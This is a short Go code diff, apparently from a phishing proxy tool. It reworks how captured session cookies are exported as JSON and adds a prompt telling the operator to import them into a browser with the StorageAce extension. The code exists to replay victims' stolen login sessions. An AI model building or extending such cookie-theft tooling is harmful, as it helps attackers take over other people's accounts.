@@ -483,6 +483,7 @@ func (t *Terminal) handleSessions(args []string) error {
 					if len(s.CookieTokens) > 0 {
 						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
 						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
+						log.Printf("%s %s %s %s%s\n\n", dgray.Sprint("(use"), cyan.Sprint("StorageAce"), dgray.Sprint("extension to import the cookies:"), white.Sprint("https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"), dgray.Sprint(")"))
 					}
 				}
 				break
@@ -1262,9 +1263,10 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 		ExpirationDate int64  `json:"expirationDate"`
 		Value          string `json:"value"`
 		Name           string `json:"name"`
-		HttpOnly       bool   `json:"httpOnly,omitempty"`
-		HostOnly       bool   `json:"hostOnly,omitempty"`
-		Secure         bool   `json:"secure,omitempty"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
 	}
 
 	var cookies []*Cookie
@@ -1278,13 +1280,16 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
 				Secure:         false,
+				Session:        false,
 			}
 			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
 				c.Secure = true
 			}
 			if domain[:1] == "." {
 				c.HostOnly = false
-				c.Domain = domain[1:]
+				// c.Domain = domain[1:] - bug support no longer needed
+				// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
+				// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
 			} else {
 				c.HostOnly = true
 			}
